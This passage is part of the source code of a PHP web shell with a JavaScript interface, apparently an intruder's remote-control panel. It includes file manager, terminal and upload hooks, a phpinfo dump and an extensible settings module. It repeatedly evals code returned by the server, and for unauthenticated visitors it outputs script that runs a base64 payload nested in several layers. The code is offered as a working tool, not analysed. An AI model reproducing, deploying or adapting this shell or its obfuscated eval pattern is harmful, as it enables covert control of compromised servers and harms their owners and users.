  const sendRequest = new AjaxRequest("POST", SCRIPT_PATH, DATA);
  sendRequest.send(
    function (data) {
      data = JSON.parse(data);
      notify(charcodeDec(data.status), data.detail);

      $("#" + charcodeDec(data.dir_con)).html(charcodeDec(data.dir_content));
      if (charcodeDec(data.status) == "success") {
        $(`#tools_container`).addClass(`hidden`);
        $(`#filemanager`).removeClass(`hidden`);
        var CX = document.querySelectorAll(".check-item");
        dir_ = 0;
        file_ = 0;
        for (var i = 0; i < CX.length; i++) {
          CX[i].getAttribute("item") == "dir" ? dir_++ : file_++;
          $(`#dir-num`).text(dir_);
          $(`#file-num`).text(file_);
          $(`#all-num`).text(dir_ + file_);
        }
      }
    },
    function (status, error) {
      if (status != 0) {
        console.error("AJAX Error:", status, error);
        clr = `red`;
        if (status >= 500) {
          clr = `yellow`;
        }
        notify(
          `error`,
          charcodeEnc(status + " " + error),
          true,
          `<i class="bx bx-error bx-tada text-5xl" ></i>`,
          `ERROR!`,
          clr,
          10000000
        );
      }
    }
  );
}

function SVD(name, value, redirect = true) {
  params = getParams();

  var action = params["action"];
  var dir = params["dir"];
  var tools = params["tools"];
  var opt = params["opt"];

  var DATA = {
    key: "SVD",
    name: name,
    value: value,
    action: action,
    dir: dir,
    tools: tools,
    opt: opt,
  };

  notify(`loading`);

  const sendRequest = new AjaxRequest("POST", SCRIPT_PATH, DATA);
  sendRequest.send(
    function (data) {
      data = JSON.parse(data);
      if (data.redirect != null) {
        redirect = data.redirect;
      }

      notify(charcodeDec(data.status), data.detail, redirect);

      $("#" + charcodeDec(data.dir_con)).html(charcodeDec(data.dir_content));

      var CX = document.querySelectorAll(".check-item");
      dir_ = 0;
      file_ = 0;
      for (var i = 0; i < CX.length; i++) {
        CX[i].getAttribute("item") == "dir" ? dir_++ : file_++;
        $(`#dir-num`).text(dir_);
        $(`#file-num`).text(file_);
        $(`#all-num`).text(dir_ + file_);
      }

      if (charcodeDec(data.temp) != ``) {
        eval(charcodeDec(data.temp));
      }
    },
    function (status, error) {
      if (status != 0) {
        console.error("AJAX Error:", status, error);
        clr = `red`;
        if (status >= 500) {
          clr = `yellow`;
        }
        notify(
          `error`,
          charcodeEnc(status + " " + error),
          true,
          `<i class="bx bx-error bx-tada text-5xl" ></i>`,
          `ERROR!`,
          clr,
          10000000
        );
      }
    }
  );
}

function EXD(action, dir, tools, file, dirname, opt) {
  var DATA = {
    key: "EXD",
    action: action,
    dir: dir,
    tools: tools,
    file: file,
    dirname: dirname,
    opt: opt,
  };

  if (ALWAYS_SHOW_FILEMANAGER) {
    $("#tools_container").addClass(`hidden`);
  }

  if (
    (!ALWAYS_SHOW_FILEMANAGER && tools != null) ||
    (!ALWAYS_SHOW_FILEMANAGER && opt != null) ||
    (!ALWAYS_SHOW_FILEMANAGER && tools != null && opt != null)
  ) {
    $("#filemanager").addClass(`hidden`);
  }

  $(`#dir-num`).text(`-`);
  $(`#file-num`).text(`-`);
  $(`#all-num`).text(`-`);

  notify(`loading`);

  const sendRequest = new AjaxRequest("POST", SCRIPT_PATH, DATA);
  sendRequest.send(
    function (data) {
      data = JSON.parse(data);
      Swal.close();

      if (!ALWAYS_SHOW_FILEMANAGER) {
        if (
          charcodeDec(data.content) == "" ||
          charcodeDec(data.content) == "DONT_SHOW_TOOLS"
        ) {
          $("#filemanager").removeClass(`hidden`);
        }

        $("#tools_container").addClass(`hidden`);
      }

      if (!charcodeDec(data.content).includes("DONT_SHOW_TOOLS")) {
        $("#" + charcodeDec(data.container)).removeClass("hidden");
      } else {
        location.href = `#action=${action}&dir=${dir}`;
      }
      $("#" + charcodeDec(data.container)).html(charcodeDec(data.content));
      $("#" + charcodeDec(data.dir_con)).html(charcodeDec(data.dir_content));
      $("#" + charcodeDec(data.cwd_con)).html(charcodeDec(data.cwd_content));
      $("#" + charcodeDec(data.menu_con)).html(charcodeDec(data.menu_content));

      var CX = document.querySelectorAll(".check-item");
      dir_ = 0;
      file_ = 0;
      for (var i = 0; i < CX.length; i++) {
        CX[i].getAttribute("item") == "dir" ? dir_++ : file_++;
        $(`#dir-num`).text(dir_);
        $(`#file-num`).text(file_);
        $(`#all-num`).text(dir_ + file_);
      }

      $.tablesorter.addParser({
        id: "ignore-brackets",
        is: function () {
          return false;
        },
        format: function (s, table, cell) {
          return $(cell).closest("tr").attr("data-ignore") ? "" : s;
        },
        type: "text",
      });

      $("#dir_table").tablesorter({
        headers: {
          0: { sorter: false },
          1: { sorter: "ignore-brackets" },
          2: { sorter: "ignore-brackets" },
          3: { sorter: "ignore-brackets" },
          4: { sorter: "ignore-brackets" },
          5: { sorter: false },
          6: { sorter: "ignore-brackets" },
          7: { sorter: false },
        },
        cssHeader: "tablesorter-header",
        textExtraction: function (node) {
          return $(node).closest("tr").attr("data-ignore")
            ? ""
            : $(node).text();
        },
      });

      $("#dir_table").on("sortEnd", function () {
        var ignoreRow = $("tr[data-ignore]");
        if (ignoreRow.length) {
          ignoreRow.prependTo("#dir_table tbody");
        }
      });

      $("#dir_table")
        .on("sortStart", function () {
          $(".tablesorter-header").removeClass("sort-up sort-down");
        })
        .on("sortEnd", function () {
          const sortList = $("#dir_table")[0].config.sortList;
          for (let i = 0; i < sortList.length; i++) {
            const [column, direction] = sortList[i];
            const header = $(`#dir_table th:eq(${column})`);
            if (direction === 0) {
              header.addClass("sort-up");
            } else {
              header.addClass("sort-down");
            }
          }
        });

      if (tools == "'. Utils::__string_enc('phpinfo') .'") {
        $("#filemanager").addClass(`hidden`);
        $("#tools_container").addClass(`overflow-auto`);
      }
    },
    function (status, error) {
      if (status != 0) {
        console.error("AJAX Error:", status, error);
        clr = `red`;
        if (status >= 500) {
          clr = `yellow`;
        }
        notify(
          `error`,
          charcodeEnc(status + " " + error),
          true,
          `<i class="bx bx-error bx-tada text-5xl" ></i>`,
          `ERROR!`,
          clr,
          10000000
        );
      }
    }
  );
}

function DD(c, o, i, id = null, hiddenval = null) {
  if (hiddenval != null) {
    datas = JSON.parse(charcodeDec(hiddenval));
    var dataR = [];
    vals = ``;
    dataR.push(datas);
    if (id != null) {
      addedVal = $(`#${id}`).val();
      var added = { added: addedVal, index: i };
      dataR.push(added);
    }
    vals = charcodeEnc(JSON.stringify(dataR));
    eval(datas.func + "(`${vals}`)");
    return false;
  }
  if (charcodeDec(o) == `copy`) {
    var copyText = document.getElementById(id);

    copyText.select();
    copyText.setSelectionRange(0, 999999);

    navigator.clipboard.writeText(copyText.value);

    notify(`success`, charcodeEnc(`Command copied!`), false);
    return false;
  }

  if (id != null) {
    id = charcodeEnc($(`#${id}`).val());
  } else {
    id = ``;
  }

  var DATA = {
    key: "RDA",
    config: c,
    option: o,
    index: i,
    value: id,
  };

  const sendRequest = new AjaxRequest("POST", SCRIPT_PATH, DATA);
  sendRequest.send(
    function (data) {
      data = JSON.parse(data);
      if (charcodeDec(data.status) == `log`) {
        console.log(`status => logging`);
        console.log(`detail => ` + charcodeDec(data.detail));
      } else {
        notify(charcodeDec(data.status), data.detail, false);
      }

      if (charcodeDec(data.update) != ``) {
        eval(charcodeDec(data.update));
      }
    },
    function (status, error) {
      console.error("AJAX Error:", status, error);
    }
  );
}
';
        }
        function tools_js()
        {
            $JS_FUNCTION = '';
            $JS_FUNCTION = Upload::__upload_js().Terminal::__terminal_js();
            $JS_FUNCTION .= loaded_routes_script();
            return $JS_FUNCTION;
        }

        if (Session::__check_session()) {

            return '
        <script>
        ' . js() . '
        </script>
        <script id="tools_script">
        ' . tools_js() . '
        </script>
        ';
        } else {
            return "<script>eval(atob(`ZXZhbChhdG9iKGBaWFpoYkNoaGRHOWlLR0JhV0Zwb1lrTm9hR1JIT1dsTFIwSmhWMFp3YjFsclRtOWhSMUpJVDFkc1RGSXdTbkJWYm5CelkxWmtWMXBFVWxkU01VcEpWREZvYzFkc1dYbFZiazVWVW5wV1VGbHJaRk5TYlVwRlVXMUdWMlZyU2pKVk1uQkxWREF3ZUdORlVscE5NRFZNV2xaa1QyUXhVWHBaZW14UlZqQkdkMU14UlRsUVYwRndTMUU5UFdBcEtRPT1gKSk=`))</script>";
        }
    }

    public static function __separator($color)
    {
        return "<svg class='rtl:rotate-180 w-3 h-3 $color mx-1' aria-hidden='true' xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 6 10'>
                    <path stroke='currentColor' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='m1 9 4-4-4-4' />
                </svg>";
    }

    public static function __get_pwd($path)
    {
        $pathComponents = explode(__DIRECTORY_SEPARATOR__, trim($path, __DIRECTORY_SEPARATOR__));
        $breadcrumb = '';
        $currentPath = '';

        foreach ($pathComponents as $index => $component) {
            $currentPath .= Utils::__construct_path($component);
            $encodedPath = Utils::__string_enc($currentPath);
            $encodedComponent = htmlspecialchars($component, ENT_QUOTES, 'UTF-8');
            $isLast = ($index === array_key_last($pathComponents));

            if ($index === 0) {
                $breadcrumb .= "
                <li class='inline-flex items-center'>
                    <a href='#action=" . $GLOBALS['ER0_string']['filesman'] . "&dir=".($GLOBALS['ER0_string']['sys'] == 'win' ? $currentPath : Utils::__string_enc('/'))."' class='inline-flex items-center text-sm font-medium text-themecolor-400 hover:text-foreground'>
                        <svg class='w-3 h-3 me-2.5' aria-hidden='true' xmlns='http://www.w3.org/2000/svg' fill='currentColor' viewBox='0 0 20 20'>
                            <path d='m19.707 9.293-2-2-7-7a1 1 0 0 0-1.414 0l-7 7-2 2a1 1 0 0 0 1.414 1.414L2 10.414V18a2 2 0 0 0 2 2h3a1 1 0 0 0 1-1v-4a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1v4a1 1 0 0 0 1 1h3a2 2 0 0 0 2-2v-7.586l.293.293a1 1 0 0 0 1.414-1.414Z' />
                        </svg>
                    </a>
                    <a href='#action=" . $GLOBALS['ER0_string']['filesman'] . "&dir=$encodedPath' class='inline-flex items-center text-sm font-medium text-themecolor-400 hover:text-foreground'>
                    " . $encodedComponent . "
                    </a>
                </li>";
            } elseif (!$isLast) {
                $breadcrumb .= "
                <li>
                    <div class='flex items-center'>
                        " . self::__separator('text-themecolor-400') . "
                        <a href='#action=" . $GLOBALS['ER0_string']['filesman'] . "&dir=$encodedPath' class='ms-1 text-sm font-medium md:ms-2 text-themecolor-400 hover:text-foreground text-left'>$encodedComponent</a>
                    </div>
                </li>";
            } else {
                $breadcrumb .= "
                <li aria-current='page'>
                    <div class='flex items-center'>
                        " . self::__separator('text-themecolor-400') . "
                        <span class='ms-1 text-sm font-medium md:ms-2 text-themecolor-400 text-left'>$encodedComponent </span></div></li>";
            }
        }

        // Append permissions to the last component
        $lastComponentPath = Utils::__construct_path(implode(__DIRECTORY_SEPARATOR__, $pathComponents));
        $breadcrumb .= "
        <li>
                    <div class='flex items-start justify-center gap-1'>
                    <span class='text-foreground'>[</span>" . Filesman::__get_permission($lastComponentPath, ' ') . "<span class='text-foreground'>]</span><a href='#action=" . $GLOBALS['ER0_string']['filesman'] . '&dir=' . Utils::__string_enc(dirname(__SCRIPT_PATH__)) . "' class=' font-medium hover:brightness-75 text-left text-primary'><span class='text-foreground'>[ </span><i class='bx bx-home mr-1'></i>Home Shell<span class='text-foreground'> ]</span></a>
                    </div>
        </li>

        ";

        return $breadcrumb;
    }

    /**
     * Print formated Info in html output
     * @param string $title
     * @param string $data
     */
    public static function __create_info($title, $data)
    {
        $html = '
        <div class="grid gap-1 p-3 grid-cols-4 sm:grid-cols-1 lg:grid-cols-4 sm:gap-4 items-center">
            <dt class="font-medium text-foreground">' . $title . '</dt>
            <dd class="col-span-3 text-themecolor-300">' . $data . '</dd>
        </div>
        ';
        return $html;
    }

    /**
     * Print formated Tools menu in html output
     * @param string $title
     * @param string $param
     * @param string $directory
     * @param string $icon
     * @param bool $isActive
     */
    public static function __create_menu($title, $param, $directory, $icon, $isActive)
    {
        $hidden = '';
        $link = $title !== 'Home' ? '#action=' . $GLOBALS['ER0_string']['tools'] . '&dir=' . $directory . '&tools=' . $param : basename(__SCRIPT__);
        if ($title == 'Setting') {
            $link = '#action=' . $GLOBALS['ER0_string']['setting'] . '&dir=' . $directory;
            $hidden = 'sm:hidden';
        } else if ($title == 'Logout') {
            $link = '?' . $GLOBALS['ER0_string']['logout'];
            $hidden = 'sm:hidden';
        }

        $isActive = $isActive ? "text-themecolor-50 active bg-primary" : 'text-themecolor-400 bg-themecolor-800 hover:brightness-75 hover:text-foreground';
        $html = '
        <a href="' . $link . '" class="' . $hidden . ' border border-themecolor-600 shadow-themecolor-shadow shadow-lg text-sm font-medium inline-flex items-center px-3 py-1 rounded-lg w-auto h-auto ' . $isActive . '" aria-current="page">
            <i class="text-lg me-2 ' . $icon . '"></i>
            <span class="truncate">' . $title . '</span>
        </a>';

        return $html;
    }

    /**
     * Create Container for tools
     * @param string $action
     * @param string $directory
     * @param string $inputId
     * @param string $inputLabel
     * @param string $inputElement
     * @param string $textareaId
     * @param string $textareaLabel
     * @param string $textareaElement
     * @param bool $useTextarea
     */
    public static function __generate_tools_container($action, $directory, $inputId, $inputLabel, $inputElement, $textareaId, $textareaLabel, $textareaElement, $useTextarea = true, $opt = null)
    {

        $EDITORLIST = ['edit', 'create_file'];
        $DONTREDIRECT = ['edit'];
        $DONTREDIRECTICON = ['<i class="bx bx-save"></i>'];
        $EXEASICON = '';
        $EDITORTHEME = '';
        $EDITORFONT = '';

        if (in_array($opt, $DONTREDIRECT)) {
            $CNT = 0;
            foreach ($DONTREDIRECT as $option) {
                if ($opt == $option) {
                    $EXEASICON = $DONTREDIRECTICON[$CNT];
                }
                $CNT++;
            }
        }

        foreach ($GLOBALS['ER0_array']['editor_theme'] as $theme) {
            $EDITORTHEME .= "<option value='$theme'>$theme</option>";
        }

        foreach ($GLOBALS['ER0_array']['editor_font'] as $font) {
            $EDITORFONT .= "<option value='$font'>$font</option>";
        }

        $editorOption = (in_array($opt, $EDITORLIST) ? '<div class="md:flex gap-2 mt-4">
        <select id="editor_theme" onchange="wrapWord = false; if(document.getElementById(`editor_wrap`).checked){ wrapWord = true; } saveEditorConfig(`editor_theme`,`editor_font`,`editor_font_size`, wrapWord)" class="p-2.5 bg-themecolor-700 w-full border border-themecolor-600 placeholder-themecolor-400 text-foreground text-sm rounded focus:ring-primary focus:border-primary block">
        ' . $EDITORTHEME . '
        </select>

        <div class="flex gap-2 mt-2 md:mt-0">
        <select id="editor_font" onchange="wrapWord = false; if(document.getElementById(`editor_wrap`).checked){ wrapWord = true; } saveEditorConfig(`editor_theme`,`editor_font`,`editor_font_size`, wrapWord)" class="p-2.5 bg-themecolor-700 w-full md:w-auto border border-themecolor-600 placeholder-themecolor-400 text-foreground text-sm rounded focus:ring-primary focus:border-primary block">
        ' . $EDITORFONT . '
        </select>

        <input type="number" id="editor_font_size" onchange="wrapWord = false; if(document.getElementById(`editor_wrap`).checked){ wrapWord = true; } saveEditorConfig(`editor_theme`,`editor_font`,`editor_font_size`, wrapWord)" step=".5" value="12" class="border text-sm rounded-lg block w-16 p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary">

        <div class="w-auto flex items-center gap-2 border rounded-lg block bg-themecolor-700 border-themecolor-600 text-foreground">
            <input id="editor_wrap" value="true" onchange="wrapWord = false; if(this.checked){ wrapWord = true; } saveEditorConfig(`editor_theme`,`editor_font`,`editor_font_size`, wrapWord)" type="checkbox" class="check-item m-2.5 mr-0 w-4 h-4 accent-[#f283b6] text-[#f283b6] rounded focus:ring-[#f283b6] ring-offset-themecolor-800 focus:ring-offset-themecolor-800 focus:ring-2 bg-themecolor-700 border-themecolor-600">
            <label for="editor_wrap" class="block text-sm font-medium text-foreground p-2.5 pl-0">Wrap</label>
        </div>
        </div>

        </div>


        <script>
        if(localStorage.getItem("ER0_editorConfig") != null){
            dataset = JSON.parse(localStorage.getItem("ER0_editorConfig"));
            $(`#editor_theme`).val(dataset.theme);
            $(`#editor_font`).val(dataset.font);
            $(`#editor_font_size`).val(dataset.size);

            document.getElementById(`editor_wrap`).checked = dataset.wrap;
        }
        </script>
        ' : '');
        $onclick = $inputId == 'bulk' ? 'onclick="$(`#tools_container`).addClass(`hidden`); $(`#filemanager`).removeClass(`hidden`);"' : 'href="#action=' . $action . '&dir=' . $directory . '"';
        $execonclickAs = $inputId == 'bulk' ? 'onclick="S(`' . Utils::__charcode_enc('{"0": "'.$action.'", "1": "'.$inputId.'", "2": "'.$textareaId.'"}') . '`)"' : 'onclick="S(`' . Utils::__charcode_enc('{"0": "'.$inputId.'", "1": "'.$textareaId.'"}') . '`,false)"';
        $execonclick = $inputId == 'bulk' ? 'onclick="S(`' . Utils::__charcode_enc('{"0": "'.$action.'", "1": "'.$inputId.'", "2": "'.$textareaId.'"}') . '`)"' : 'onclick="S(`' . Utils::__charcode_enc('{"0": "'.$inputId.'", "1": "'.$textareaId.'"}') . '`)"';

        $inputL = !empty($inputLabel) ? '<label for="' . $inputId . '" class="block mb-2 text-sm font-medium text-foreground">' . $inputLabel . '</label>' : '';
        $textareaL = !empty($textareaLabel) ? '<label for="' . $textareaId . '" class="block mb-2 text-sm font-medium text-foreground">' . $textareaLabel . '</label>' : '';

        $executeAs = '<a ' . $execonclickAs . ' class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-foreground bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">' . $EXEASICON . '</a>';
        $execute = '<a ' . $execonclick . ' class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-foreground bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">>></a>';

        if (!$useTextarea) {
            $content = '
            <div class="gap-2 text-left">
                <div class="mb-4">
                    ' . str_replace('#EXEC#', $execute, $inputElement) . '
                </div>
            </div>';
        } else {
            $content = '
            <div class="gap-2 text-left">
                    ' . $editorOption . '
                <div class="mb-4 mt-4">
                    ' . $inputL . '
                    <div class="flex gap-2">
                        ' . $inputElement . '
                        ' . (in_array($opt, $DONTREDIRECT) ? $executeAs : '') . $execute . '
                    </div>
                </div>
                <div class="h-full flex-1">
                    ' . $textareaL . $textareaElement . '
                </div>
            </div>';
        }

        return $content;
    }

    public static function __get_phpinfo($dir)
    {
        $content = '';
        $TEXT_COLOR_RAW = $GLOBALS['themes']['foreground'];
        ob_start();
        phpinfo();
        $content .= ob_get_clean();
        $content .= '
                <script>
                var parentDiv = document.getElementById(`tools_container`);
                var elements = parentDiv.getElementsByTagName(`table`);
                var cont = parentDiv.getElementsByTagName(`div`);
                tables__ = "";
                div__ = "";

                for (var i = 0; i < 2; i++) {
                    elements[i].classList.add(`border-collapse`,`table-auto`,`w-full`,`text-left`);
                    tables__ += elements[i];
                }

                for (var i = 0; i < cont.length; i++) {
                    div__ += cont[i].innerHTML;
                }



                document.getElementById(`tools_container`).innerHTML = `
                <div class="flex gap-2 my-4">
                <input type="text" value="PHP Info, cleaned by ./MY7HX" disabled readonly class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-themecolor-400 focus:ring-primary focus:border-primary">

                <a href="#action=' . $GLOBALS['ER0_string']['filesman'] . '&dir=' . Utils::__string_enc($dir) . '" class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-foreground bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">X</a>
                </div>
                <style>

                table {
                    width:100%;
                    table-layout: auto;
                }

                .center th {
                    text-align: center !important;
                }

                td,
                th {
                    border: 1px solid ' . $GLOBALS['themes']['background'] . ';
                    font-size: 75%;
                    vertical-align: baseline;
                    padding: 4px 5px;
                }

                th {
                    position: sticky;
                    top: 0;
                    background: inherit;
                    color:' . $GLOBALS['themes']['primary'] . ';
                    background-color:' . $GLOBALS['themes']['background'] . ';
                }

                h1 {
                    font-size: 150%;
                }

                h2 {
                    font-size: 125%;
                }

                h2 a:link,
                h2 a:visited {
                    color: inherit;
                    background: inherit;
                }

                .p {
                    text-align: left;
                    color:' . $GLOBALS['themes']['primary'] . ';
                }

                .h td{
                    display:flex;
                    justify-content:start;
                    align-items:center;
                    background-color:' . $GLOBALS['themes']['background'] . ';
                }

                .h td a img{
                    display:none;
                }

                table tbody tr td a{
                    display:none;
                }

                .e {
                    color:' . $TEXT_COLOR_RAW . ';
                    font-weight: bold;
                    width:auto;
                }

                .h {
                    font-weight: bold;
                    background-color: transparent;
                }

                .v {
                    color: rgb(156 163 175);
                    background-color: transparent;
                }

                .v i {
                    color: #999;
                }

                img {
                    float: right;
                    border: 0;
                }

                hr {
                    width: 100%;
                    background-color: ' . $GLOBALS['themes']['background'] . ';
                    border: 0;
                    height: 1px;
                }

                .h td .p{
                    width:100%;
                    font-size:3em;
                    text-align: center;
                }
                h1 {
                    padding: 15px 0 15px 0;
                    font-weight: bold;
                    color:' . $GLOBALS['themes']['primary'] . ';
                    background-color:' . $GLOBALS['themes']['background'] . ';
                }
                h2 {
                    padding: 15px 0 15px 0;
                    color:' . $GLOBALS['themes']['primary'] . ';
                    background-color:' . $GLOBALS['themes']['background'] . ';
                }
                tr .v {
                    word-break: break-word;
                }
                </style>
                <div class="bg-transparent">

                <div class="relative overflow-auto h-[96vh] overflow-y-scroll rounded-lg bg-transparent">
                `+div__+`</div></div>`;
                </script>
                ';

        return $content;
    }
}


class Settings
{
    public static function __settings_html($dir){
        // your additional code ...
        return
'<!-- To use php code, wrap the php code with this tag
-->

<span class="flex items-center mb-4 justify-center gap-2"><a href="#action='.$GLOBALS['ER0_string']['filesman'].'&dir='.Utils::__string_enc($dir).'"
        class="text-2xl cursor-pointer font-medium inline-flex items-center text-foreground hover:text-primary"><i
            class="bx bx-left-arrow-alt"></i></a><i class="bx bx-cog"></i>Settings</span>

<!-- Example Input wrapper for tools -->
<div class="md:flex gap-2 text-left">
    <div class="w-full">
        <label for="exampleSelect" class="block mb-2 text-sm font-medium text-foreground">Example Select</label>
        <select id="exampleSelect"
            class="p-2.5 bg-themecolor-700 w-auto border border-themecolor-600 placeholder-themecolor-400 text-foreground text-sm rounded focus:ring-primary focus:border-primary block">
            <option value="1" selected class="text-left">option 1</option>
            <option value="2" class="text-left">option 2</option>
        </select>
    </div>
    <div class="w-full">
        <label for="exampleInput1" class="block mb-2 text-sm font-medium text-foreground">Example Title 1</label>
        <input type="text" id="exampleInput1"
            class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary"
            placeholder="Example input placeholder">
    </div>
    <div class="w-full mt-4 md:mt-0">
        <label for="exampleInput2" class="block mb-2 text-sm font-medium text-foreground">Example Title 2</label>
        <div class="flex gap-2">
            <input type="text" id="exampleInput2"
                class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary"
                placeholder="Example input placeholder">
            <!-- add your submit onclick function here -->
            <a onclick=""
                class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-foreground bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">>></a>
        </div>
    </div>
</div>

<!-- Example Details wrapper for tools (accordion style) -->
<div class="relative overflow-auto text-left w-full">
    <details class="group [&_summary::-webkit-details-marker]:hidden my-4" open>
        <summary class="text-foreground flex cursor-pointer items-center justify-start mb-2 gap-1.5 rounded-lg">
            <h2 class="font-medium text-sm">Details Title</h2>
            <svg class="w-3 h-3 shrink-0 transition duration-300 group-open:-rotate-180"
                xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6" stroke="currentColor">
                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                    d="M9 5 5 1 1 5"></path>
            </svg>
        </summary>
        <div class="h-auto flex-1">
            <div id="details_id"
                class="h-auto max-h-[50vh] overflow-auto whitespace-pre block p-2 w-full text-sm rounded-lg border bg-themecolor-700 border-themecolor-600 text-themecolor-400">

                Example Text

            </div>
        </div>
    </details>
</div>

<!-- Example Table wrapper for tools -->
<!-- You can add the table wrapper into detail wrapper -->
<div class="h-auto flex-1 overflow-auto max-h-[50vh] rounded-lg border bg-themecolor-700 border-themecolor-600">
    <table class="table-auto text-sm w-full text-themecolor-400">
        <thead class="text-xs uppercase bg-themecolor-700 text-themecolor-400 rounded-t-lg">
            <tr class="border-b bg-themecolor-800 p-2 border-themecolor-600">
                <th scope="col" class="px-6 py-3">Title 1</th>
                <th scope="col" class="px-6 py-3">Title 2</th>
                <th scope="col" class="px-6 py-3">Title 3</th>
            </tr>
        </thead>
        <tbody>
            <tr class="border-b p-2 border-themecolor-600">
                <td class="px-6 py-4">
                    Normal Text
                </td>
                <td class="px-6 py-4">
                    <div class="flex items-center">
                        <span class="truncate w-20">Truncate Text</span>
                    </div>
                </td>
                <td class="px-6 py-4">
                    <div class="flex items-center justify-center">
                        <span class="w-[4.5rem]">Centered Text</span>
                    </div>
                </td>
            </tr>
        </tbody>
    </table>
</div>

<!-- Change tools container to overflow-auto -->
<!-- uncomment this script code if you wanna change the overflow into auto -->
<!--
<script>
$(`#tools_container`).addClass(`overflow-auto`);
</script>
-->'
        ;
    }

    public static function __settings_js()
    {
        if (Session::__check_session()) {
            return
'function Settings(parameters){

    /* To use php code, wrap the php code with this tag
    */

    const params = getParams(); /* To get the parameters value, returned array [action, dir, tools, file, dirname, opt] */

    var DATA = {
        "key": "NTSSTGIE", /* Key Automatic synced with key from POST */
        "dir": params[`dir`], /* Don`t remove this, required post data */
        "MyPost": charcodeEnc(params), /* you can add more data in here */
    };

    notify(`loading`); /* if you commented this, the popup loading will not show when post the data */

    const sendRequest = new AjaxRequest("POST", SCRIPT_PATH, DATA);
    sendRequest.send(
        function (data) {
            data = JSON.parse(data);
            if(charcodeDec(data.status) == `log`){
                //if post success, and status set into `log` then it will print the response in console

                console.log(`status => logging`);
                console.log(`detail => `+charcodeDec(data.detail));
            } else {

                //if post success, then it will get the response here
                notify(charcodeDec(data.status), data.detail);
            }

            //if post success, and `update` key not set into `NOTUSE` then it will eval the code from `update` key
            if(charcodeDec(data.update) != `NOTUSE`){
                eval(charcodeDec(data.update));
            }

        },
        function (status, error) {
            if(status != 0){
                console.error("AJAX Error:", status, error);
                clr = `red`;
                if(status >= 500){
                    clr = `yellow`;
                }
                // you can change the error handle here, default if error, it will redirect into previous/go back
                // you can change the redirect into false to disable redirect
                redirect = true;
                notify(`error`, charcodeEnc(status +" "+ error),redirect, `<i class="bx bx-error bx-tada text-5xl" ></i>`, `ERROR!`, clr, 10000000);
            }
        }
    );
}'
            ;
        }
    }

    public static function __settings_function()
    {
        if (isset($_POST["key"]) && Request::__post_request("key") == "NTSSTGIE") {
            // init, post required (dir)
            $path = Utils::__string_dec(Request::__post_request("dir"));
            $path = Utils::__construct_path($path);
            chdir($path);
            $STATUS = "failed";
            $DETAIL = "";
            $UPDATE = "NOTUSE";

            // Your ajax post data
            $MyPost = Utils::__charcode_dec(Request::__post_request("MyPost"));

            // Return response in json
            // Don`t change these values unless you know what you`re doing
            $response = [
                "status" => Utils::__charcode_enc($STATUS),
                "detail" => Utils::__charcode_enc($DETAIL),
                "update" => Utils::__charcode_enc($UPDATE)
            ];
            header("Content-Type: application/json");
            echo json_encode($response);
            exit();
        }
    }
}
